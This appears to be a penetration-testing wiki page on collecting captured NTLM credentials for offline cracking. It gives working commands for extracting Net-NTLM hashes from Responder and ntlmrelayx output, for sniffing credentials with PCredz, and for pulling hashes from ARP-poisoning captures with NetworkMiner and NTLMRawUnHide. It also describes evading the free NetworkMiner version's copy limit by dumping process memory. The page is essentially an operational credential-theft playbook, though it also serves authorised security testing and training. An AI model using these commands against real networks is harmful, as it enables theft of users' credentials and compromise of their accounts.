**NTLM credentials gathering** — various tools capture the NTLM authentication of users and computers on the network. This note covers how to collect the data those tools produce so it can be cracked later.

## Exploitation

### Responder - see [LLMNR and NBT-NS Poisoning](LLMNR%20and%20NBT-NS%20Poisoning.md)

Responder ships with a helper - `DumpHash.py` - that reads captured Net-NTLM hashes from its SQLite database.

```bash

# From the default installation directory
cd /usr/share/responder
./DumpHash.py

```

You can also extract them manually from the logs. This filters out machine accounts and keeps one response hash per user:

```bash

cat /usr/share/responder/logs/*.txt | grep -v '$:' | sort -u -k1,1 -t ':'

```

### ntlmrelayx.py - see [NTLM Relay](../Relay%20Attacks/NTLM%20Relay/NTLM%20Relay.md)

Use `-of` to store Net-NTLM hashes, e.g. `-of "./loot/ntlmrelayx"` writes `./loot/ntlmrelayx_ntlmv2` for NTLMv2 responses.

```bash

cat ./loot/ntlmrelayx_ntlmv2 | grep -v '$:' | sort -u -k1,1 -t ':'

```

### PCredz - see [ARP Cache Poisoning](ARP%20Cache%20Poisoning.md)

PCredz inspects traffic on an interface and extracts credentials on the fly, including Net-NTLM responses.

```bash

# -c - Disable Credit Card number scanning
Pcredz -i INTERFACE -c

```

### NetworkMiner - see [ARP Cache Poisoning](ARP%20Cache%20Poisoning.md)

NetworkMiner (Windows) parses PCAP files and extracts credentials and even files (e.g. over SMBv2).

1. Perform the ARP-poisoning MitM.
2. Capture with Wireshark and save as PCAPNG.
3. Convert PCAPNG to PCAP:

```bash

editcap -F libpcap -T ether arpspoof1.pcapng arpspoof1.pcap

```

4. Open the PCAP in NetworkMiner.

**Note:** The free version limits how many entries you can copy from the output. Workaround: dump the process memory, then use `strings64.exe` / `findstr` to extract the parsed hashes.

### NTLMRawUnHide - see [ARP Cache Poisoning](ARP%20Cache%20Poisoning.md)

Extract Net-NTLM response hashes from a capture file:

```bash

git clone https://github.com/mlgualtieri/NTLMRawUnHide
cd NTLMRawUnHide
./NTLMRawUnHide.py -i "capture.pcapng" -o "capture.txt"

```

### Cracking

See [Windows Password Cracking](../Credential%20Dumping/Windows%20Password%20Cracking.md).

## References

- PCredz - https://github.com/lgandx/PCredz
- NetworkMiner - https://www.netresec.com/?page=NetworkMiner
- NTLMRawUnHide - https://github.com/mlgualtieri/NTLMRawUnHide
